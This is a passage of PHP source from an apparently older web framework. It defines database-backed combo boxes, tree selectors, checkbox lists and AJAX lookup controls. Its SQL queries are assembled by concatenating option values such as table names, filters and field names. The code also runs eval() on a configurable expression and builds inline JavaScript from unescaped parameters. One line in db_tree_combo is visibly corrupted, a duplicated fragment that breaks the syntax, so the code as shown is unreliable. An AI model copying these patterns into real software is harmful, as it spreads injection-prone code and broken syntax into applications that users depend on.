        if (!$read_only)
          $this->add(new combo_item($value, $name, ($selected == $value)));
        else
        if ($selected == $value)
          $this->text = $name;

    if ($sql_text)
      $sql = $sql_text;
    else 
      $sql = 'SELECT * FROM '.$table;

    if ($base_table_alias) 
      $base_table_alias .= '.';

    if (preg_match('/WHERE/i', $sql))
      $sql = preg_replace('/WHERE/i', sql_placeholder('WHERE '.$base_table_alias.$key_field.' = ? AND ', $selected), $sql, 1);
    else  
    if (preg_match('/ORDER/i', $sql))
      $sql = preg_replace('/ORDER/i', sql_placeholder('WHERE '.$base_table_alias.$key_field.' = ? ORDER', $selected), $sql, 1);
    else  
      $sql .= sql_placeholder(' WHERE '.$base_table_alias.$key_field.' = ?', $selected);
      
    $query = $db->query($sql);
    while ($row = $db->next_row($query)) {
      if (!$read_only) {
        if (($group_field) and ($row[$group_field] != $last_group)) {
          $value = for_html($row[$group_field]); 
          $this->add(new combo_group_label($value));
          $last_group = $row[$group_field];
        }
        $value = for_html($row[$name_field]);
        if ($always_set and !$selected) 
          $selected = $row[$key_field];
        $this->add(new combo_item($row[$key_field], $value, (strlen($selected) and ($selected == $row[$key_field]))));
      } else 
      if (strlen($selected) and ($selected == $row[$key_field]))
        $this->text = $row[$name_field];
    }

    $params = '';
    foreach ($ajax_params as $name => $value) {
      $params .= '&'.$name.'='.$value;
    }

    $this->set_attribute("onmouseover", "ajax_load_combo(this,'".$ajax_method."','".$params."');");
    $this->set_attribute("onfocus",     "ajax_load_combo(this,'".$ajax_method."','".$params."');");
   
  }

}

class db_list extends combo {

  var $options;
  var $check_attributes;

  function db_list($options, $attributes = array()) {

    $this->__can_contain[] = 'combo_item';
    $this->__can_contain[] = 'combo_group_label';

    $this->options = $options;

    parent::combo($attributes);

    $this->generate_items();

  }

  function generate_items() {

    //$width             = safe($this->options, 'width',             '100%');
    $size              = safe($this->options, 'size',              10);
    
    $table             = safe($this->options, 'table');
    $sql_text          = safe($this->options, 'sql_text');
    $selected          = safe($this->options, 'selected',          array());
    $key_field         = safe($this->options, 'key_field',         'id');
    $name_field        = safe($this->options, 'name_field',        'name');
    $order_field       = safe($this->options, 'order_field',       $name_field);
    $group_field       = safe($this->options, 'group_field',       'parent_id');
    $filter            = safe($this->options, 'filter',            '1=1');
    $read_only         = safe($this->options, 'read_only');
    $style_text        = safe($this->options, 'style_text');
    $style_combo       = safe($this->options, 'style_combo');
    
    $style_group       = safe($this->options, 'style_group');
    $group_separator   = safe($this->options, 'group_separator',   ': ');
    $show_groups       = safe($this->options, 'show_groups');
    $group_mode        = safe($this->options, 'group_mode',        'table');
    $select_group      = safe($this->options, 'select_group');
    //$group_id          = safe($this->options, 'group_id',          $id);
    $group_selected    = safe($this->options, 'group_selected',    $selected);
    $group_table       = safe($this->options, 'group_table',       $table);
    $group_key_field   = safe($this->options, 'group_key_field',   $key_field);
    $group_name_field  = safe($this->options, 'group_name_field',  $name_field);
    $group_order_field = safe($this->options, 'group_order_field', $group_name_field);
    $group_value_modifier = safe($this->options, 'group_value_modifier');

    $link_table        = safe($this->options, 'link_table');
    $link_fk_field     = safe($this->options, 'link_fk_field');
    $link_pk_field     = safe($this->options, 'link_pk_field');
    $key_value         = safe($this->options, 'key_value');

    $on_click          = safe($this->options, 'onclick');

    global $db;
    
    if (!$read_only) {
      
      $id = $this->id();
      $template_id = $this->template_id();
      $this->set_id($id.'[]');
      $this->set_template_id($template_id);
      $this->set_attribute('size',     $size);
      $this->set_attribute('multiple', true);
      //$this->set_attribute('width',    $width);

      if ($sql_text) {
        $sql = $sql_text;
      } else
      if ($show_groups) {
        if ($group_mode == 'table')
          $sql =  'SELECT a.'.$key_field.' id'
                 .'     , a.'.$name_field.' name'
                 .'     , a.'.$group_field.' group_id'
                 .'     , b.'.$group_name_field.' group_name'
                 .'  FROM '.$table.' a'
                 .'     , '.$group_table.' b'
                 .' WHERE a.'.$group_field. ' = b.'.$group_key_field
                 .'   AND '.$filter
                 .' ORDER BY b.'.$group_order_field.', b.'.$group_key_field.', a.'.$order_field.', a.'.$key_field;
        else
          $sql =  'SELECT '.$group_field.' group_name'
                 .'     , '.$key_field.' id'
                 .'     , '.$name_field.' name'
                 .'  FROM '.$table
                 .' WHERE 1=1'
                 .'   AND '.$filter
                 .' ORDER BY '.$group_field.', '.$order_field.', '.$key_field;
      } else {
        $sql =  'SELECT a.'.$key_field.' id'
               .'     , a.'.$name_field.' name'
               .'  FROM '.$table.' a'
               .' WHERE '.$filter
               .' ORDER BY a.'.$order_field;
      }
      $query = $db->query($sql);
      
      $last_group  = '';                        

      while ($row = $db->next_row($query)) {

        if ($row['name']) {
          // group rendering
          if ($group_value_modifier) {
            $expression = 'return '.placeholder($group_value_modifier, $row['group_name']);
            $row['group_name'] = eval($expression);
          }

          if (($show_groups) and ($row['group_name'] != $last_group)) {
            $this->add(new combo_group_label( $row['group_name'] ));
            $last_group = $row['group_name'];
          }
          
          $attributes = array();
          if ($on_click)
            $attributes['onclick'] = $on_click;
            
          $this->add(new combo_item( $row['id'], $row['name'], in_array($row['id'], $selected), $attributes));
        }
        
      }
      
    } else {
      
      $this->tag = 'span';

      if ($show_groups) {
        $sql = sql_placeholder( 'SELECT a.'.$name_field.' name'.
                                '     , c.'.$group_name_field. ' group_name'.
                                '  FROM '.$table.' a'.
                                '     , '.$group_table.' c'.
                                '     , '.$link_table.' b'.
                                ' WHERE a.'.$group_field. ' = c.id'.
                                '   AND b.'.$link_fk_field.' = a.id'.
                                '   AND b.'.$link_pk_field.' = ?'.
                                ' ORDER BY c.'.$group_order_field.', c.id, a.'.$order_field.', a.id'
                              , $key_value);
      } else {
        $sql = sql_placeholder( 'SELECT a.'.$name_field.' name'.
                                '  FROM '.$table.' a'.
                                '     , '.$link_table.' b'.
                                ' WHERE b.'.$link_fk_field.' = a.id'.
                                '   AND b.'.$link_pk_field.' = ?'.
                                ' ORDER BY a.'.$order_field
                              , $key_value);
      }

      $last_group  = '';
      $first_group = true;
      $first       = true;
      if ($query = $db->query($sql)) {
        while ($row = $db->next_row($query)) {
          if ($show_groups and ($last_group != $row['group_name'])) {
            if (!$first_group)
              $this->text .= ';&nbsp;';
            $this->text .= $row['group_name'].$group_separator.$row['name'];
            $first_group = false;
            $first = false;
            $last_group = $row['group_name'];
          } else {
            if ($first)
              $this->text .= $row['name'];
            else
              $this->text .= ',&nbsp;'.$row['name'];
            $first = false;
          }
        }
      }

    }
  }

}

class db_tree_combo extends combo {

  var $options;

  function db_tree_combo($options, $attributes = array()) {

    $this->options = $options;

    parent::combo($attributes);
    
  }

  function do_render($args = array()) {
  
    global $dm;
    global $db;
      
    $table              = safe($this->options, 'table');
    $sql_text           = safe($this->options, 'sql_text');
    $selected           = safe($this->options, 'selected');
    $key_field          = safe($this->options, 'key_field', 'id');
    $name_field         = safe($this->options, 'name_field', 'name');
    $order_field        = safe($this->options, 'order_field', $name_field);
    $parent_field       = safe($this->options, 'parent_field', 'parent_id');
    $read_only          = safe($this->options, 'read_only', false);
    $required           = safe($this->options, 'required', false);
    $plain              = safe($this->options, 'plain', false);
    $strip_color        = safe($this->options, 'strip_color', false);
    $soft_sort          = safe($this->options, 'soft_sort', false); 
    $always_set         = safe($this->options, 'always_set', false); 
    $custom_values      = safe($this->options, 'custom_values');
    $empty_name         = safe($this->options, 'empty_name');
    $multiple           = safe($this->options, 'multiple', false);
    $filter             = safe($this->options, 'filter');
    $self_ref           = safe($this->options, 'self_ref', false);
    $self_ref_key       = safe($this->options, 'self_ref_key');
    $disable_nested_set = safe($this->options, 'disable_nested_set');

    if ($multiple and !is_array($selected))
      $selected = array();
      
    $exceptions        = safe($this->options, 'exceptions');
    if (!is_array($exceptions))
      $exceptions = array($exceptions);

    $start_from        = safe($args, 'start_from', 0);
    $indent            = safe($args, 'indent',     0);

    if ($soft_sort)
      critical_error('Soft sorting not supported in this version');
      
    if (safe($args, 'internal_call'))
      $empty_name = '';
    else
    if (!$empty_name)
      if ($required)
        $empty_name = (get_config('application/show_please_select_as_space_in_editors')?' ':trn('&lt;Please select&gt;'));
      else
        $empty_name = (get_config('application/show_not_selected_as_space_in_editors')?' ':trn('&lt;Not selected&gt;'));

    if (!$always_set and $empty_name)
      if (!$read_only and !$multiple) 
        $this->add(new combo_item(null, $empty_name));
      
    if (!safe($args, 'internal_call'))
      if ($custom_values)
        foreach($custom_values as $value => $name)
          if (!$read_only)
            if ($multiple)
              $this->add(new combo_item($value, $name, (in_array($selected, $value))));
            else  
              $this->add(new combo_item($value, $name, ($selected == $value)));
          else
          if ($selected == $value)
            $this->text = $name;

    if ($read_only)    
      $this->tag = 'span';

    if ($dm->is_nested_set($table) && !$disable_nested_set) {
                   
      if (!$sql_text) {
        if ($self_ref and $self_ref_key)
          $except = $db->row('SELECT left_key, right_key FROM '.$table.' WHERE '.$dm->key_field($table).' = ?', $self_ref_key);
        else 
          $except = array();     
        $sql = $dm->select_tree($table, null, $except, $filter);
      } else {
        $sql = $sql_text;  
        if ($filter)
          $sql .= ' AND '.$filter;
      }
      
      $query = $db->query($sql);
      if ($db->support('count_by_resource'))
        $rows_count = $db->count($query);
      else
        $rows_count = $db->count($sql);
        
      $first_level = 0;
      $kpath = '';
      
      $row_prior = array();
      
      if ($strip_color)
        $attributes = array('style' => 'background-color: '.$strip_color.';');
      else  
        $attributes = array();

      while ($row = $db->next_row($query)) {
        if (!in_array($row[$key_field], $exceptions)) {
          ifkey_field], $exceptions)) {
          if (!$first_level)
            $first_level = $row['level'];
            
          if ($plain) {
            if ($row_prior and $row_prior['level'] != $row['level']) {
                if ($row_prior['level'] < $row['level']) { //level up
                  $kpath .= $row_prior[$name_field].'::';
                } else { //level down
                  $kpath = rtrim($kpath, '::');
                  for ($i = $row['level']; $i<$row_prior['level']; $i++) {
                    //$kpath = substr($kpath, 0, strrpos($kpath, '::')); //php5 ONLY! :(
                    //php4
                    $arr = explode('::', $kpath);
                    array_pop($arr);
                    $kpath = implode('::', $arr);
                 }
                 if ($kpath) $kpath .= '::';
                }
            }
          } 
          
          if ($plain) 
            $path = $kpath;
          else 
            $path = @str_repeat('&nbsp;', ($row['level']-$first_level)*3);  

          if (!$read_only) {
            if ($strip_color and !$row['parent_id']) 
              if (safe($attributes, 'style'))
                $attributes = array();
              else  
                $attributes = array('style' => 'background-color: '.$strip_color.';');
                
            if ($multiple)
              $this->add(new combo_item($row[$key_field], $path.$row[$name_field], (in_array($row[$key_field], $selected)), $attributes));  
            else
              $this->add(new combo_item($row[$key_field], $path.$row[$name_field], (strlen($selected) and ($selected == $row[$key_field])), $attributes));  
          } else 
            $this->text = $path.$row[$name_field];
                      
          $row_prior = $row;
        }
      }
      
    } else {  
               
      if ($sql_text)
        $sql = $sql_text.placeholder(' AND CASE WHEN '.$parent_field.' IS NULL THEN 0 ELSE '.$parent_field.' END = ?', $start_from);
      else
        $sql = placeholder('SELECT * FROM '.$table.' WHERE CASE WHEN '.$parent_field.' IS NULL THEN 0 ELSE '.$parent_field.' END = ?', $start_from);
      
      if ($self_ref and $self_ref_key and !safe($args, 'internal_call'))
        $sql .= placeholder(' AND '.$key_field.' != ?', $self_ref_key);
        
      if ($filter)
        $sql .= ' AND '.$filter;
                          
      if ((strpos($sql, 'order') === false) and (strpos($sql, 'ORDER') === false))
        $sql .= ' ORDER BY '.$order_field;

      $query = $db->query($sql);
      if ($db->support('count_by_resource'))
        $rows_count = $db->count($query);
      else
        $rows_count = $db->count($sql);

      if ($plain) {
        $prefix = safe($args, 'name_prefix');
        if ($prefix)
          $prefix .= '::';
      } else {
        $prefix = str_repeat('&nbsp;', $indent*3);
      }  
        
      while ($row = $db->next_row($query)) {
        if (!in_array($row[$key_field], $exceptions)) {
          $name = $prefix.$row[$name_field];
          
          if ($multiple)
            $sel = (in_array($row[$key_field], $selected));
          else
            $sel = (strlen($selected) and ($selected == $row[$key_field]));
          if (!$read_only)
            $this->add(new combo_item($row[$key_field], $name, $sel));
          else  
          if ($sel)
            $this->text = $name;

          $args['start_from']    = $row['id'];
          $args['indent']        = $indent + 1;
          $args['internal_call'] = true;
          $args['name_prefix']   = $name;

          $this->do_render($args);
        }
      }
    }
  }

}

class db_check_list extends html_container_control {

  var $options;
  var $check_attributes;

  function db_check_list($options, $check_attributes = array()) {

    $this->options = $options;
    $this->check_attributes = $check_attributes;

    parent::html_container_control();

    $this->generate_items();

  }

  function generate_items() {

    $id                = safe($this->check_attributes, 'id');
    $disabled          = safe($this->check_attributes, 'disabled');
    
    $table             = safe($this->options, 'table');
    $sql_text          = safe($this->options, 'sql_text');
    $selected          = safe($this->options, 'selected',          array());
    $key_field         = safe($this->options, 'key_field',         'id');
    $name_field        = safe($this->options, 'name_field',        'name');
    $order_field       = safe($this->options, 'order_field',       $name_field);
    $group_field       = safe($this->options, 'group_field',       'parent_id');
    $dic_field         = safe($this->options, 'dic_field');
    $filter            = safe($this->options, 'filter',            '1=1');
    $columns_count     = safe($this->options, 'col_count',         4); 
    $read_only         = safe($this->options, 'read_only');
    $style_text        = safe($this->options, 'style_text');
    $style_check_box   = safe($this->options, 'style_check_box');
    $style_combo       = safe($this->options, 'style_combo');
    $width             = safe($this->options, 'width',             '100%');
    $item_separator    = safe($this->options, 'item_separator',    ',&nbsp;');
    $hidden            = safe($this->options, 'hidden');
    $check_table_id    = safe($this->options, 'check_table_id');
    //$check_table_name  = safe($this->options, 'check_table_name');
    $on_change         = safe($this->options, 'on_change');
    
    $style_group       = safe($this->options, 'style_group');
    $group_separator   = safe($this->options, 'group_separator',   ': ');
    $show_groups       = safe($this->options, 'show_groups');
    $group_mode        = safe($this->options, 'group_mode',        'table');
    $select_group      = safe($this->options, 'select_group');
    $group_id          = safe($this->options, 'group_id',          $id);
    $group_selected    = safe($this->options, 'group_selected',    $selected);
    $group_table       = safe($this->options, 'group_table',       $table);
    $group_key_field   = safe($this->options, 'group_key_field',   $key_field);
    $group_name_field  = safe($this->options, 'group_name_field',  $name_field);
    $group_order_field = safe($this->options, 'group_order_field', $group_name_field);
    $group_value_modifier = safe($this->options, 'group_value_modifier');

    $dic_table         = safe($this->options, 'dic_table');
    $dic_field         = safe($this->options, 'dic_field');
    $dic_group_field   = safe($this->options, 'dic_group_field');//,   'parent_id');
    $dic_name_field    = safe($this->options, 'dic_name_field',    'name');
    $dic_order_field   = safe($this->options, 'dic_order_field',   $dic_name_field);
    $dic_empty_name    = safe($this->options, 'dic_empty_name');

    $link_table        = safe($this->options, 'link_table');
    $link_fk_field     = safe($this->options, 'link_fk_field');
    $link_pk_field     = safe($this->options, 'link_pk_field');
    $key_value         = safe($this->options, 'key_value');

    global $db;

    if (is_array($name_field))
      $name_fields = 'a.'.implode(',a.', $name_field);
    else 
      $name_fields = 'a.'.$name_field;
    if (is_array($order_field))
      $order_fields = 'a.'.implode(',a.', $order_field);
    else 
      $order_fields = 'a.'.$order_field;
      
    if (!$read_only) {

      if ($sql_text) {
        $sql = $sql_text;
      } else {
        if ($show_groups) {
          if ($dic_table and $dic_field and $dic_group_field) {
            $sql =  'SELECT a.'.$key_field.' id'
                   .'     , '.$name_fields
                   .'     , a.'.$dic_field.' dic_field'
                   .'     , a.'.$group_field.' group_id'
                   .'     , b.'.$group_name_field.' group_name'
                   .'  FROM '.$table.' a'
                   .'     , '.$group_table.' b'
                   .' WHERE a.'.$group_field. ' = b.'.$group_key_field
                   .'   AND '.$filter
                   .' ORDER BY b.'.$group_order_field.', b.'.$group_key_field.', '.$order_fields.', a.'.$key_field;
          } else {
            if ($group_mode == 'table')
              $sql =  'SELECT a.'.$key_field.' id'
                     .'     , '.$name_fields
                     .'     , a.'.$group_field.' group_id'
                     .'     , b.'.$group_name_field.' group_name'
                     .'  FROM '.$table.' a'
                     .'     , '.$group_table.' b'
                     .' WHERE a.'.$group_field. ' = b.'.$group_key_field
                     .'   AND '.$filter
                     .' ORDER BY b.'.$group_order_field.', b.'.$group_key_field.', '.$order_fields.', a.'.$key_field;
            else
              $sql =  'SELECT a.'.$group_field.' group_name'
                     .'     , a.'.$key_field.' id'
                     .'     , '.$name_fields
                     .'  FROM '.$table.' a'
                     .' WHERE 1=1'
                     .'   AND '.$filter
                     .' ORDER BY a.'.$group_field.', '.$order_fields.', a.'.$key_field;
          }
        } else {
          if ($dic_table and $dic_field and $dic_group_field) {
            $sql =  'SELECT a.'.$key_field.' id'
                   .'     , '.$name_fields
                   .'     , a.'.$dic_field.' dic_field'
                   .'  FROM '.$table.' a'
                   .' WHERE '.$filter
                   .' ORDER BY '.$order_fields;
          } else {
            $sql =  'SELECT a.'.$key_field.' id'
                   .'     , '.$name_fields
                   .'  FROM '.$table.' a'
                   .' WHERE '.$filter
                   .' ORDER BY '.$order_fields;
          }
        }
      }
      $query = $db->query($sql);
      
      $last_group  = '';            
      $attributes = array( 'width'       => $width
                         , 'cellpadding' => 0
                         , 'cellspacing' => 0
                         , 'class' => 'edt_check_list'
                         );
      if ($hidden)
        $attributes['style'] = 'display:none;';
      if ($check_table_id)
        $attributes['id'] = $check_table_id;
      //if ($check_table_name)
      //  $attributes['name'] = $check_table_name;
      $check_table = new table($attributes);
      $count       = 0;

      while ($row = $db->next_row($query)) {
        
        $name_value = '';
        if (is_array($name_field)) {
          foreach($name_field as $field)
            $name_value = trim($name_value.' '.$row[$field]);
        } else 
          $name_value = $row[$name_field];

        if ($name_value) {
          // group rendering
          if ($group_value_modifier) {
            $expression = 'return '.placeholder($group_value_modifier, $row['group_name']);
            $row['group_name'] = eval($expression);
          }

          if (($show_groups) and ($row['group_name'] != $last_group)) {

              
            if ($count > 0) {
              while ($count < $columns_count) {
                $check_row->add(new table_cell());
                $count++;
              }
              $check_table->add($check_row);
              
            }

            $check_row  = new table_row();
            $check_cell = new table_cell(array( 'colspan' => $columns_count
                                              , 'class'   => 'header'
                                              , 'width'   => '100%'
                                              ));
            if ($select_group) {
              $check_cell->add(new check_label( $row['group_name']
                                              , array( 'id'      => $group_id.'['.$row['group_id'].']'
                                                     , 'checked' => array_key_exists($row['group_id'], $group_selected)
                                                    )
                                             ));
            } else {
              $check_cell->add(new text($row['group_name']));
            }

            $check_row->add($check_cell);
            
            $check_table->add($check_row);
            
            $count = 0;

            $last_group = $row['group_name'];

          }

          if ($count == 0)
            $check_row = new table_row();

          $check_cell = new table_cell(array('width' => round(100/$columns_count).'%'));

          if ($dic_table) {
            $check_cell->add(new text($name_value));
            $check_cell->add(new space());
            if ($dic_group_field and ($row['dic_field'])) {
              $check_cell->add(new db_combo( array( 'selected' => safe($selected, $row['id'])
                                                  , 'sql_text' => 'SELECT *'.
                                                                  '  FROM '.$dic_table.
                                                                  ' WHERE '.$dic_group_field.' = '.$row['dic_field']
                                                  , 'empty_name'  => $dic_empty_name
                                                  , 'order_field' => $dic_order_field
                                                  )
                                           , array( 'id'       => $id.'['.$row['id'].']'
                                                  )));
            } else {
              $check_cell->add(new db_combo( array( 'selected' => safe($selected, $row['id'])
                                                  , 'sql_text' => 'SELECT *'.
                                                                  '  FROM '.$dic_table
                                                  , 'empty_name'  => $dic_empty_name
                                                  , 'order_field' => $dic_order_field
                                                  )
                                           , array( 'id'       => $id.'['.$row['id'].']'
                                                  )));
            }
          } else {  
            $attributes = array( 'id'       => $id.'['.$row['id'].']'
                               , 'checked'  => array_key_exists($row['id'], $selected)
                               );
            if ($on_change)
              $attributes['onclick'] = $on_change;  
            if ($disabled)
              $attributes['disabled'] = true;
            $check_cell->add(new check_label($name_value, $attributes));
          }
          $check_row->add($check_cell);
          
          $count++;
          if ($count == $columns_count) {
            $check_table->add($check_row);
            
            $count = 0;
          }
        }
        
      }
      if ($count > 0) {
        while ($count < $columns_count) {
          $check_row->add(new table_cell());
          $count++;
        }
        $check_table->add($check_row);
        
      }
      $this->add($check_table);
      

    } else {

      if ($show_groups) {
        if ($dic_table) 
          $sql = sql_placeholder( 'SELECT CASE WHEN d.'.$dic_name_field.' IS NULL THEN a.'.$name_field.' ELSE CONCAT(a.'.$name_field.", ': ', d.".$dic_name_field.') END '.$name_field.
                                  '     , c.'.$group_name_field.' group_name'.
                                  '  FROM '.$table.' a'.
                                  '     , '.$group_table.' c'.
                                  '     , '.$link_table.' b'.
                                  '       LEFT OUTER JOIN '.$dic_table.' d ON b.'.$dic_field.' = d.id'.
                                  ' WHERE a.'.$group_field. ' = c.id'.
                                  '   AND b.'.$link_fk_field.' = a.'.$key_field.
                                  '   AND b.'.$link_pk_field.' = ?'.
                                  ' ORDER BY c.'.$group_order_field.', c.id, a.'.$order_field.', a.'.$key_field
                                , $key_value);
        else
          $sql = sql_placeholder( 'SELECT a.'.$name_field.' '.$name_field.
                                  '     , c.'.$group_name_field. ' group_name'.
                                  '  FROM '.$table.' a'.
                                  '     , '.$group_table.' c'.
                                  '     , '.$link_table.' b'.
                                  ' WHERE a.'.$group_field. ' = c.id'.
                                  '   AND b.'.$link_fk_field.' = a.'.$key_field.
                                  '   AND b.'.$link_pk_field.' = ?'.
                                  ' ORDER BY c.'.$group_order_field.', c.id, '.$order_fields.', a.'.$key_field
                                , $key_value);
      } else {
        if ($dic_table) 
          $sql = sql_placeholder( 'SELECT CASE WHEN d.'.$dic_name_field.' IS NULL THEN a.'.$name_field.' ELSE CONCAT(a.'.$name_field.", ': ', d.".$dic_name_field.') END '.$name_field.
                                  '  FROM '.$table.' a'.
                                  '     , '.$link_table.' b'.
                                  '       LEFT OUTER JOIN '.$dic_table.' d ON b.'.$dic_field.' = d.id'.
                                  ' WHERE b.'.$link_fk_field.' = a.'.$key_field.
                                  '   AND b.'.$link_pk_field.' = ?'.
                                  ' ORDER BY '.$order_fields
                                , $key_value);
        else
          $sql = sql_placeholder( 'SELECT '.$name_fields.
                                  '  FROM '.$table.' a'.
                                  '     , '.$link_table.' b'.
                                  ' WHERE b.'.$link_fk_field.' = a.'.$key_field.
                                  '   AND b.'.$link_pk_field.' = ?'.
                                  ' ORDER BY '.$order_fields
                                , $key_value);
      }

      $last_group  = '';
      $first_group = true;
      $first       = true;
      if ($query = $db->query($sql)) {
        while ($row = $db->next_row($query)) {
          $name_value = '';
          if (is_array($name_field)) {
            foreach($name_field as $field)
              $name_value = trim($name_value.' '.$row[$field]);
          } else 
            $name_value = $row[$name_field];
          if ($show_groups and ($last_group != $row['group_name'])) {
            if (!$first_group)
              $this->add(new text(';&nbsp;'));
            //$this->add(new strong());
            $this->add(new text($row['group_name'].$group_separator.$name_value));
            $first_group = false;
            $first = false;
            $last_group = $row['group_name'];
          } else {
            if ($first)
              $this->add(new text($name_value));
            else
              $this->add(new text($item_separator.$name_value));
            $first = false;
          }
        }
      }

    }

  }
}

class db_master_detail_combo extends combo {

  var $options;

  function db_master_detail_combo($options, $attributes = array()) {

    $this->__can_contain[] = 'combo_item';
    $this->__can_contain[] = 'combo_group_label';

    $this->options = $options;

    parent::combo($attributes);

    $this->generate_items();

  }

  function generate_items() {

    global $db;

    $sql1          = safe($this->options, 'sql1');
    $sql2          = safe($this->options, 'sql2');
    $key_field     = safe($this->options, 'key_field', 'id');
    $name_field    = safe($this->options, 'name_field', 'name');
    $parent_field  = safe($this->options, 'parent_field');
    $read_only     = safe($this->options, 'read_only');
    $selected      = safe($this->options, 'selected');
    $required      = safe($this->options, 'required', false);
    $custom_values = safe($this->options, 'custom_values');
    $empty_name    = safe($this->options, 'empty_name');
    if (!$empty_name)
      if ($required)
        $empty_name = (get_config('application/show_please_select_as_space_in_editors')?' ':trn('&lt;Please select&gt;'));
      else
        $empty_name = (get_config('application/show_not_selected_as_space_in_editors')?' ':trn('&lt;Not selected&gt;'));

    if ($empty_name)
      if (!$read_only)
        $this->add(new combo_item(null, $empty_name));

    if ($custom_values)
      foreach($custom_values as $value => $name)
        if (!$read_only)
          $this->add(new combo_item($value, $name, ($selected == $value)));
        else
        if ($selected == $value)
          $this->text = $name;

    if (!$read_only) {
      $array1 = $db->query_to_array($sql1);
      $array2 = $db->query_to_array($sql2);

      foreach($array1 as $row1) {
        $group_label = new combo_group_label($row1[$name_field]);
        foreach($array2 as $row2) {
          if ($row2[$parent_field] == $row1[$key_field]) {
            $group_label->add(new combo_item($row2[$key_field], $row2[$name_field], ($row2[$key_field] == $selected)));
          }
        }
        $this->add($group_label);
      }
    } else {
      $this->tag = "span";
      $array2 = $db->query_to_array($sql2);

      foreach($array2 as $row2) {
        if ($row2[$key_field] == $selected) {
          $this->text = $row2[$name_field];
          break;
        }
      }
    }

  }

}

class lookup extends html_container_control {

  function lookup($options, $attributes = array()) {

    $id = safe($attributes, 'id');
    $text_id  = $id."[text]";
    $value_id = $id."[value]";
    $attributes["id"] = $text_id;

    $ajax_method      = safe($options, 'ajax_method');
    $ajax_param       = safe($options, 'ajax_param');
    $value            = safe($options, 'value');
    $text             = safe($options, 'text');
    $show_if_selected = safe($options, 'show_if_selected');
    $on_select        = addslashes(safe($options, "on_select"));
    $on_enter_pressed = addslashes(safe($options, "on_enter_pressed"));
    $min_length       = safe($options, 'min_length', 1);
    $text_allowed     = safe($options, 'text_allowed');

    parent::html_container_control();
    
    $this->add(new hidden($value_id, $value));
    $attributes['value'] = $text;
    $this->add(new edit($attributes));
    $this->add(new script("makeLookupCombo('$id', '$ajax_method', '$show_if_selected', $min_length, '$text_allowed', '$on_select', '$on_enter_pressed', '$ajax_param');"));

  }

}

class db_lookup extends html_container_control {

  var $options;
  var $lookup_attributes;

  function db_lookup($options, $lookup_attributes = array()) {

    $this->options = $options;
    $this->lookup_attributes = $lookup_attributes;

    parent::html_container_control();

    $this->generate_items();
    
  }

  function generate_items() {

    $id                = safe($this->lookup_attributes, 'id');
    
    $table             = safe($this->options, 'table');
    $sql_text          = safe($this->options, 'sql_text');
    $value             = safe($this->options, 'value');
    $text              = safe($this->options, 'text');
    $key_field         = safe($this->options, 'key_field',         'id');
    $name_field        = safe($this->options, 'name_field',        'name');
    $filter            = safe($this->options, 'filter',            '1=1');
    $order_field       = safe($this->options, 'order_field',       $name_field);
    $base_table_alias  = safe($this->options, 'base_table_alias',  '');
    if ($base_table_alias)
      $base_table_alias .= '.';
    $read_only         = safe($this->options, 'read_only');
    $width             = safe($this->options, 'width',             '100%');
    $key_value         = safe($this->options, 'key_value');
    $ajax_method       = safe($this->options, 'ajax_method');
    $ajax_param        = safe($this->options, 'ajax_param');
    $min_length        = safe($this->options, 'min_length');
    $text_allowed      = safe($this->options, 'text_allowed');
    $on_select         = safe($this->options, "on_select");
    $on_enter_pressed  = safe($this->options, "on_enter_pressed");

    global $db;
          
    if ($value) 
      if ($sql_text)
        $row = $db->row($sql_text.' AND '.$base_table_alias.$key_field.' = ?', $value);
      else
        $row = $db->row('SELECT a.'.$key_field
                       .'     , a.'.$name_field
                       .'  FROM '.$table.' a'
                       .' WHERE '.$key_field.' = ?'
                       .' ORDER BY a.'.$order_field
                       ,$value);
    if ($read_only) {
      $this->tag = "span";
      if ($value)
        $this->text = safe($row, $name_field);
      else  
        $this->text = $value;
    } else {
      if ($value) {
        $value = $row[$key_field];
        $text  = $row[$name_field];
      }     
      $this->add(new lookup( array( "ajax_method"      => $ajax_method
                                  , "ajax_param"       => $ajax_param
                                  , "on_select"        => $on_select
                                  , "on_enter_pressed" => $on_enter_pressed
                                  , "value"            => $value
                                  , "text"             => $text
                                  , "min_length"       => $min_length
                                  , 'text_allowed'     => $text_allowed
                                  )
                           , $this->lookup_attributes));
    }
     
  }

}

class db_lookup_list extends html_container_control {

  var $options;
  var $lookup_attributes;

  function db_lookup_list($options, $lookup_attributes = array()) {

    $this->options = $options;
    $this->lookup_attributes = $lookup_attributes;

    parent::html_container_control();

  }

  function do_render() {

    $id                = safe($this->lookup_attributes, 'id');
    
    $table             = safe($this->options, 'table');
    $sql_text          = safe($this->options, 'sql_text');
    $selected          = safe($this->options, 'selected',          array());    
    $key_field         = safe($this->options, 'key_field',         'id');       
    $name_field        = safe($this->options, 'name_field',        'name');
    $filter            = safe($this->options, 'filter',            '1=1');
    $order_field       = safe($this->options, 'order_field',       $name_field);
    $base_table_alias  = safe($this->options, 'base_table_alias',  '');
    if ($base_table_alias)
      $base_table_alias .= '.';
    $read_only         = safe($this->options, 'read_only');
    $width             = safe($this->options, 'width',             '100%');
    $link_table        = safe($this->options, 'link_table');
    $link_fk_field     = safe($this->options, 'link_fk_field');
    $link_pk_field     = safe($this->options, 'link_pk_field');
    $key_value         = safe($this->options, 'key_value');
    $ajax_method       = safe($this->options, 'ajax_method');
    $ajax_param        = safe($this->options, 'ajax_param');

    global $db;

    if (!$read_only) {

      $lookup_table = new table(array('width' => $width, "cellspacing" => 0));
      $count = 0;
      if ($selected) {
        if ($sql_text) {
          $sql = placeholder($sql_text.' WHERE '.$base_table_alias.$key_field.' IN (?@)',$selected);
        } else
          $sql = placeholder('SELECT a.'.$key_field.' id'
                            .'     , a.'.$name_field.' name'
                            .'  FROM '.$table.' a'
                            .' WHERE '.$key_field.' IN (?@)'
                            .' ORDER BY a.'.$order_field
                            ,$selected);
        $query = $db->query($sql);
        while ($row = $db->next_row($query)) {
          $lookup_table->add(new table_row(new table_cell(new lookup( array( "ajax_method" => $ajax_method
                                                                           , "ajax_param"  => $ajax_param 
                                                                           , "value"       => $row['id']
                                                                           , "text"        => $row['name']
                                                                           )
                                                                    , array( 'id' => $id.'['.$count.']')
                                                                    ))));
          $count++;                                                             
        }
      }
      $lookup_table->add(new table_row(new table_cell(new lookup( array( "ajax_method"  => $ajax_method
                                                                       , "ajax_param"   => $ajax_param
                                                                       , "value"        => null
                                                                       , "text"         => null
                                                                       , "show_if_selected" => $id.__HTML_CONTROL_NAME_SEPARATOR."line".__HTML_CONTROL_NAME_SEPARATOR."1"
                                                                       )
                                                                , array( 'id' => $id.'['.$count.']'
                                                                       )
                                                                ))));
